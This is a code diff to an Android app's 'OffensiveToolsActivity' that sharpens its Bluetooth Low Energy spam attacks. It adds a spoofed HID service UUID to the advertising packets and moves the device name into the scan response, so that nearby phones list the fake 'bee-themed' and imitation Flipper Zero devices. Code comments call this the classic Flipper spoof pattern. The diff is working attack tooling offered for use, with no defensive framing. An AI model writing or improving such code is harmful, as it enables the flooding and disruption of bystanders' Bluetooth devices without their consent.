@@ -236,15 +236,15 @@ class OffensiveToolsActivity : Activity() {
 
         // Section: BLE Flood
         content.addView(buildSectionLabel("BLE SPAM", tc))
-        content.addView(buildAttackButton("BLE FLOOD", "Flood Bluetooth lists with fake device names", tc))
+        content.addView(buildAttackButton("BLE FLOOD", "Flood BLE scanners with random fake device names", tc))
         (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
             confirmAndRun("BLE Flood") { startBleFlood() }
         }
-        content.addView(buildAttackButton("BEE SPAM", "30 bee-themed devices flood every Bluetooth list", tc))
+        content.addView(buildAttackButton("BEE SPAM", "Populate Bluetooth lists with 30 bee-themed devices", tc))
         (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
             confirmAndRun("Bee Spam") { startBeeSpam() }
         }
-        content.addView(buildAttackButton("FLIPPER SPAM", "Flood Bluetooth lists with spoofed Flipper Zero names", tc))
+        content.addView(buildAttackButton("FLIPPER SPAM", "Populate Bluetooth lists with spoofed Flipper Zero devices", tc))
         (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
             confirmAndRun("Flipper Spam") { startFlipperSpam() }
         }
@@ -549,7 +549,19 @@ class OffensiveToolsActivity : Activity() {
                         currentCallback?.let { advertiser?.stopAdvertising(it) }
                     } catch (_: SecurityException) {}
 
+                    // HID service UUID in primary ad makes phones classify this
+                    // as an input peripheral and list it in Bluetooth settings.
+                    // Name travels in scan response so each cycle can show a
+                    // different bee name as setName propagates.
+                    val hidServiceUuid = android.os.ParcelUuid.fromString("00001812-0000-1000-8000-00805F9B34FB")
+
                     val adData = android.bluetooth.le.AdvertiseData.Builder()
+                        .setIncludeDeviceName(false)
+                        .setIncludeTxPowerLevel(false)
+                        .addServiceUuid(hidServiceUuid)
+                        .build()
+
+                    val scanResponse = android.bluetooth.le.AdvertiseData.Builder()
                         .setIncludeDeviceName(true)
                         .setIncludeTxPowerLevel(false)
                         .build()
@@ -574,14 +586,14 @@ class OffensiveToolsActivity : Activity() {
                         .build()
 
                     try {
-                        advertiser?.startAdvertising(settings, adData, currentCallback)
+                        advertiser?.startAdvertising(settings, adData, scanResponse, currentCallback)
                     } catch (_: SecurityException) {
                         statusText?.text = "PERMISSION DENIED"
                         isAttacking = false
                     }
-                }, 250)
+                }, 500)
 
-                handler.postDelayed(this, 1000)
+                handler.postDelayed(this, 1200)
             }
         }
         handler.post(runnable)
@@ -647,7 +659,18 @@ class OffensiveToolsActivity : Activity() {
                         currentCallback?.let { advertiser?.stopAdvertising(it) }
                     } catch (_: SecurityException) {}
 
+                    // HID service + name-in-scan-response is the classic Flipper
+                    // BLE spoof pattern. Android auto-compresses the 16-bit 0x1812
+                    // form so the scan response still has room for the full name.
+                    val hidServiceUuid = android.os.ParcelUuid.fromString("00001812-0000-1000-8000-00805F9B34FB")
+
                     val adData = android.bluetooth.le.AdvertiseData.Builder()
+                        .setIncludeDeviceName(false)
+                        .setIncludeTxPowerLevel(false)
+                        .addServiceUuid(hidServiceUuid)
+                        .build()
+
+                    val scanResponse = android.bluetooth.le.AdvertiseData.Builder()
                         .setIncludeDeviceName(true)
                         .setIncludeTxPowerLevel(false)
                         .build()
@@ -672,14 +695,14 @@ class OffensiveToolsActivity : Activity() {
                         .build()
 
                     try {
-                        advertiser?.startAdvertising(settings, adData, currentCallback)
+                        advertiser?.startAdvertising(settings, adData, scanResponse, currentCallback)
                     } catch (_: SecurityException) {
                         statusText?.text = "PERMISSION DENIED"
                         isAttacking = false
                     }
-                }, 250)
+                }, 500)
 
-                handler.postDelayed(this, 1000)
+                handler.postDelayed(this, 1200)
             }
         }
         handler.post(runnable)
